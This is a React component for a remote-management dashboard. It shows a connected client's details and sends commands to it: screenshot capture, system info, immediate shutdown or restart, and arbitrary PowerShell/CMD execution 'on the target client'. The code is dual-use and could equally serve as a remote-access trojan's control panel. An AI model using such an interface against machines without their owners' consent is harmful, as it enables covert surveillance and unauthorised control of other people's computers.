import React, { useState } from 'react';
import { FiCamera, FiPower, FiRefreshCw, FiInfo, FiSend } from 'react-icons/fi';
import toast from 'react-hot-toast';
import { API_URL } from '../../config';

interface Client {
  id: string;
  name?: string;
  computerName?: string;
  ip?: string;
  ipAddress?: string;
  os?: string;
  platform?: string;
  status?: string;
  uuid?: string;
  systemInfo?: any;
  lastSeen?: string;
}

interface ClientDetailsProps {
  client: Client | null;
  onCommandSent?: (clientId: string, command: string) => void;
}

const ClientDetails: React.FC<ClientDetailsProps> = ({ client, onCommandSent }) => {
  const [customCommand, setCustomCommand] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);

  if (!client) {
    return (
      <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
        <h2 className="text-xl font-bold text-black dark:text-white mb-4">Client Details</h2>
        <p className="text-bodydark2">Select a client to view details.</p>
      </div>
    );
  }

  const handleQuickCommand = async (command: string) => {
    if (!client.id && !client.uuid) {
      toast.error('Client ID not available');
      return;
    }

    try {
      setIsExecuting(true);
      const clientId = client.id || client.uuid;
      
      const response = await fetch(`${API_URL}/api/commands/send`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('accessToken')}`
        },
        body: JSON.stringify({
          uuid: clientId,
          command: command,
          correlationId: `cmd_${Date.now()}`
        })
      });

      if (response.ok) {
        toast.success(`Command "${command}" sent to ${client.computerName || client.name}`);
        if (onCommandSent && clientId) {
          onCommandSent(clientId, command);
        }
      } else {
        const errorData = await response.json();
        toast.error(`Failed to send command: ${errorData.message || 'Unknown error'}`);
      }
    } catch (error: any) {
      console.error('Failed to send command:', error);
      toast.error(`Error sending command: ${error.message}`);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleCustomCommand = async () => {
    if (!customCommand.trim()) {
      toast.error('Please enter a command');
      return;
    }

    await handleQuickCommand(customCommand);
    setCustomCommand('');
  };

  const getClientName = () => client.computerName || client.name || 'Unknown';
  const getClientIP = () => client.ipAddress || client.ip || 'Unknown';
  const getClientOS = () => client.platform || client.os || 'Unknown';
  const getClientStatus = () => client.status || 'Unknown';

  return (
    <div className="bg-white dark:bg-boxdark rounded-lg shadow-sm border border-stroke dark:border-strokedark p-6">
      <div className="flex items-center justify-between mb-6">
        <h2 className="text-xl font-bold text-black dark:text-white">Client Details</h2>
        <div className="flex items-center space-x-2">
          <div className={`w-3 h-3 rounded-full ${
            getClientStatus() === 'online' ? 'bg-green-500 animate-pulse' : 'bg-red-500'
          }`}></div>
          <span className="text-sm text-bodydark2 capitalize">{getClientStatus()}</span>
        </div>
      </div>

      {/* Client Information */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <div className="space-y-3">
          <div>
            <label className="text-sm font-medium text-bodydark2">Computer Name</label>
            <p className="text-black dark:text-white font-mono">{getClientName()}</p>
          </div>
          <div>
            <label className="text-sm font-medium text-bodydark2">IP Address</label>
            <p className="text-black dark:text-white font-mono">{getClientIP()}</p>
          </div>
        </div>
        <div className="space-y-3">
          <div>
            <label className="text-sm font-medium text-bodydark2">Operating System</label>
            <p className="text-black dark:text-white capitalize">{getClientOS()}</p>
          </div>
          <div>
            <label className="text-sm font-medium text-bodydark2">Client ID</label>
            <p className="text-black dark:text-white font-mono text-xs">{client.uuid || client.id}</p>
          </div>
        </div>
      </div>

      {/* Quick Actions */}
      <div className="mb-6">
        <h3 className="text-lg font-semibold text-black dark:text-white mb-3">Quick Actions</h3>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          <button
            onClick={() => handleQuickCommand('screenshot')}
            disabled={isExecuting || getClientStatus() !== 'online'}
            className="flex items-center justify-center space-x-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors"
          >
            <FiCamera className="w-4 h-4" />
            <span className="text-sm">Screenshot</span>
          </button>
          
          <button
            onClick={() => handleQuickCommand('systeminfo')}
            disabled={isExecuting || getClientStatus() !== 'online'}
            className="flex items-center justify-center space-x-2 px-4 py-2 bg-green-600 hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors"
          >
            <FiInfo className="w-4 h-4" />
            <span className="text-sm">System Info</span>
          </button>
          
          <button
            onClick={() => handleQuickCommand('shutdown /s /t 0')}
            disabled={isExecuting || getClientStatus() !== 'online'}
            className="flex items-center justify-center space-x-2 px-4 py-2 bg-red-600 hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors"
          >
            <FiPower className="w-4 h-4" />
            <span className="text-sm">Shutdown</span>
          </button>
          
          <button
            onClick={() => handleQuickCommand('shutdown /r /t 0')}
            disabled={isExecuting || getClientStatus() !== 'online'}
            className="flex items-center justify-center space-x-2 px-4 py-2 bg-orange-600 hover:bg-orange-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors"
          >
            <FiRefreshCw className="w-4 h-4" />
            <span className="text-sm">Restart</span>
          </button>
        </div>
      </div>

      {/* Custom Command Section */}
      <div>
        <h3 className="text-lg font-semibold text-black dark:text-white mb-3">Custom Command</h3>
        <div className="flex space-x-3">
          <input
            type="text"
            value={customCommand}
            onChange={(e) => setCustomCommand(e.target.value)}
            placeholder="Enter custom command (e.g., dir, ipconfig, tasklist)"
            className="flex-1 px-3 py-2 border border-stroke dark:border-strokedark rounded-lg bg-white dark:bg-boxdark text-black dark:text-white focus:ring-2 focus:ring-primary focus:border-transparent"
            onKeyPress={(e) => e.key === 'Enter' && handleCustomCommand()}
            disabled={isExecuting || getClientStatus() !== 'online'}
          />
          <button
            onClick={handleCustomCommand}
            disabled={isExecuting || !customCommand.trim() || getClientStatus() !== 'online'}
            className="px-4 py-2 bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-lg transition-colors flex items-center space-x-2"
          >
            {isExecuting ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                <span>Executing...</span>
              </>
            ) : (
              <>
                <FiSend className="w-4 h-4" />
                <span>Execute</span>
              </>
            )}
          </button>
        </div>
        <p className="text-xs text-bodydark2 mt-2">
          Supports PowerShell and CMD commands. Commands will be executed on the target client.
        </p>
      </div>

      {/* System Information */}
      {client.systemInfo && (
        <div className="mt-6">
          <h3 className="text-lg font-semibold text-black dark:text-white mb-3">System Information</h3>
          <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4">
            <pre className="text-sm text-black dark:text-white whitespace-pre-wrap">
              {JSON.stringify(client.systemInfo, null, 2)}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
};

export default ClientDetails;